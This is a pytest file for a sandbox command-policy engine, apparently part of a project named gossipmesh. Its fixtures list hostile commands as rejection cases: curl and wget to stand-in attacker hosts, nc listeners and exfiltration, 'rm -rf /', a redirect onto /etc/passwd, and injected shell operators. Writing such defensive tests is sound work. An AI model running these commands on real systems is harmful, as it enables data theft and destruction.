"""Unit tests for Deny-by-Default Sandbox Command Policy (Task 82)."""

import os
import sys
import pytest
from gossipmesh.core.exceptions import SandboxSecurityError, SandboxError
from gossipmesh.runtime.sandbox import CommandPolicyEngine, SandboxEnvironment


def test_rejects_raw_shell_strings():
    """Verify raw string commands are strictly rejected."""
    with SandboxEnvironment(workflow_id="wf-100") as env:
        with pytest.raises(SandboxSecurityError) as exc_info:
            env.run_command("pytest tests/")
        assert "Raw shell strings are strictly prohibited" in str(exc_info.value)


def test_rejects_unapproved_binaries():
    """Verify non-whitelisted binaries (curl, bash, nc, wget) are denied."""
    forbidden_commands = [
        ["curl", "http://malicious.com/payload.sh"],
        ["bash", "-c", "echo hacked"],
        ["sh", "-c", "id"],
        ["nc", "-l", "4444"],
        ["wget", "http://evil.com/leak"],
        ["sudo", "rm", "-rf", "/"],
    ]

    for cmd in forbidden_commands:
        with pytest.raises(SandboxSecurityError) as exc_info:
            CommandPolicyEngine.validate_command(cmd)
        assert "is not permitted in sandbox" in str(exc_info.value)


def test_rejects_shell_metacharacters_in_arguments():
    """Verify injection of pipe, semicolon, backgrounding, and redirect operators is blocked."""
    injection_attempts = [
        ["python", "script.py; rm -rf /"],
        ["python", "script.py | nc 1.2.3.4 9999"],
        ["python", "script.py && id"],
        ["pytest", "tests/ > /etc/passwd"],
        ["ruff", "check `cat /proc/environ`"],
    ]

    for cmd in injection_attempts:
        with pytest.raises(SandboxSecurityError) as exc_info:
            CommandPolicyEngine.validate_command(cmd)
        assert "Dangerous shell operator" in str(exc_info.value)


def test_git_subcommand_restriction():
    """Verify only read-only Git operations (status, diff, log) are permitted."""
    # Allowed
    assert CommandPolicyEngine.validate_command(["git", "status"]) == ["git", "status"]
    assert CommandPolicyEngine.validate_command(["git", "diff"]) == ["git", "diff"]

    # Forbidden
    with pytest.raises(SandboxSecurityError) as exc_info:
        CommandPolicyEngine.validate_command(["git", "config", "--global", "user.name", "attacker"])
    assert "is forbidden in sandbox" in str(exc_info.value)

    with pytest.raises(SandboxSecurityError) as exc_info:
        CommandPolicyEngine.validate_command(["git", "remote", "add", "evil", "http://evil.com"])
    assert "is forbidden in sandbox" in str(exc_info.value)


def test_python_dangerous_inline_code_blocked():
    """Verify inline python with os.system or subprocess is blocked."""
    dangerous_python = [
        ["python", "-c", "import os; os.system('whoami')"],
        ["python", "-c", "import subprocess; subprocess.Popen('id')"],
        ["python", "-c", "import socket; s = socket.socket()"],
    ]

    for cmd in dangerous_python:
        with pytest.raises(SandboxSecurityError) as exc_info:
            CommandPolicyEngine.validate_command(cmd)
        assert "Dangerous inline Python construct" in str(exc_info.value)


def test_environment_variable_sanitization():
    """Verify sensitive tokens and keys are scrubbed from sandbox environment."""
    dirty_env = {
        "PATH": "/usr/bin:/bin",
        "HOME": "/home/user",
        "AWS_SECRET_ACCESS_KEY": "supersecretkey123",
        "GITHUB_TOKEN": "ghp_1234567890abcdef",
        "DATABASE_URL": "postgresql://user:pass@localhost:5432/db",
        "GEMINI_API_KEY": "AIzaSySecretKey",
        "NORMAL_VAR": "safe_value",
    }

    clean_env = CommandPolicyEngine.sanitize_environment(dirty_env)

    assert "PATH" in clean_env
    assert "NORMAL_VAR" in clean_env
    assert clean_env["NORMAL_VAR"] == "safe_value"
    assert clean_env["GOSSIPMESH_SANDBOX"] == "true"

    # Scrubbed variables
    assert "AWS_SECRET_ACCESS_KEY" not in clean_env
    assert "GITHUB_TOKEN" not in clean_env
    assert "DATABASE_URL" not in clean_env
    assert "GEMINI_API_KEY" not in clean_env


def test_approved_command_execution():
    """Verify an approved command executes cleanly in sandbox."""
    with SandboxEnvironment(workflow_id="wf-test-approved") as env:
        # Run python --version using current sys.executable
        returncode, stdout, stderr = env.run_command([sys.executable, "--version"], timeout=10)
        assert returncode == 0
        assert "Python" in stdout or "Python" in stderr
